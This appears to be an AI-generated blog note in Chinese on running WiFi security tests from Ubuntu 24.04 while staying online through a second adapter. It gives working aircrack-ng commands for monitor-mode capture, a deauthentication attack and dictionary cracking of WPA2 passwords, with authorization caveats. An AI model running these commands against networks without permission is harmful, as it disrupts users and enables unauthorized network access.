---
audio: false
generated: true
image: false
lang: hant
layout: post
model: x-ai/grok-4-fast
title: 雙重WiFi適配器用於安全測試
translated: true
type: note
---

是的，Ubuntu 24.04 可以透過已知密碼連接一個 WiFi 網絡（用於上網），同時嘗試「破解」（例如猜解或測試）另一個 WiFi 網絡的密碼，但這需要特定硬體和謹慎配置以避免衝突。這種設定常見於對自有網絡進行道德滲透測試或安全審計——請注意未經授權的存取是違法的。

### 關鍵要求
- **兩個 WiFi 適配器**：您至少需要兩個獨立的無線介面（例如內置筆記型電腦 WiFi 作為 `wlan0` 用於連接，USB WiFi 適配器作為 `wlan1` 用於監控）。單一適配器無法同時處於連接狀態（受管模式）和監控模式。
  - 推薦用於監控模式的適配器：Intel（如 AX200/AX210）、Atheros 或相容的 Realtek 晶片組。使用 `iw list` 檢查相容性（查看支援介面模式中的「monitor」）。
- **工具**：安裝 `aircrack-ng` 套件用於掃描、擷取握手封包及破解：  
  ```
  sudo apt update && sudo apt install aircrack-ng
  ```
- **Ubuntu 24.04 注意事項**：與舊版相比無重大變更——NetworkManager 處理連接，但監控模式工具若未妥善管理可能產生干擾。Kernel 6.8+ 對現代適配器支援良好。

### 運作原理：逐步設定
1. **連接已知 WiFi（受管模式）**：
   - 使用 NetworkManager（圖形介面或指令）正常連接：  
     ```
     nmcli device wifi connect "您的已知SSID" password "已知密碼"
     ```
   - 驗證：`nmcli connection show --active`。這將保持您的首個介面（如 `wlan0`）網絡連線有效。

2. **設定第二適配器用於監控（不干擾首個連接）**：
   - 識別介面：`iw dev`（例如 `wlan1` 是您的 USB 適配器）。
   - 避免使用 `airmon-ng`（來自 aircrack-ng），因為它通常會終止 NetworkManager 並中斷連接。改用手動 `iw` 指令：  
     ```
     sudo ip link set wlan1 down
     sudo iw dev wlan1 set type monitor
     sudo ip link set wlan1 up
     ```
   - 驗證：`iw dev`（應顯示 `wlan1` 的 `type monitor`）。

3. **掃描與擷取用於密碼破解**：
   - 掃描網絡：`sudo airodump-ng wlan1`（列出 SSID、BSSID、頻道；按 Ctrl+C 停止）。
   - 鎖定特定網絡（例如 BSSID `AA:BB:CC:DD:EE:FF` 在頻道 6）：  
     ```
     sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 -w capture wlan1
     ```
     這會將封包擷取至 `capture-01.cap`。對於 WPA2 破解，等待四次握手（或透過斷線攻擊強制觸發：`sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan1`）。
   - 離線破解：`sudo aircrack-ng -w /路徑/至/字典.txt -b AA:BB:CC:DD:EE:FF capture-01.cap`。

4. **恢復正常運作**：
   - 停止監控：  
     ```
     sudo ip link set wlan1 down
     sudo iw dev wlan1 set type managed
     sudo ip link set wlan1 up
     ```
   - 如有需要重新連接：重啟 NetworkManager（`sudo systemctl restart NetworkManager`）或使用 `nmcli`。

### 潛在問題與解決方法
- **連接中斷**：若首個 WiFi 斷線（手動模式下較少見），更新 DHCP：`sudo dhclient -r wlan0 && sudo dhclient wlan0`。
- **干擾問題**：僅終止監控介面上的衝突程序：`sudo airmon-ng check kill`（但會影響所有介面——請謹慎使用）。
- **USB 適配器穩定性**：部分廉價適配器在監控模式下會斷線；使用 `iwconfig` 或 `iw dev` 測試。
- **有線替代方案**：若無第二 WiFi，可使用乙太網絡上網，並在單一 WiFi 適配器上進行監控（更簡單，因為終止 NetworkManager 不會影響有線連接）。

此設定在 Ubuntu 24.04 上可穩定用於測試目的。測試網絡前務必取得授權。

### 參考資料
- [How to enable WiFi while using two wireless cards one in monitor mode](https://security.stackexchange.com/questions/121215/how-to-enable-wifi-while-using-two-wireless-cards-one-in-monitor-mode-and-other)  
- [Wireless Packet Capture using Ubuntu 24 LTS](https://www.reddit.com/r/RGNets/comments/1l4672v/wireless_packet_capture_using_ubuntu_24_lts/)  
- [Aircrack-ng Newbie Guide](https://www.aircrack-ng.org/doku.php?id=newbie_guide)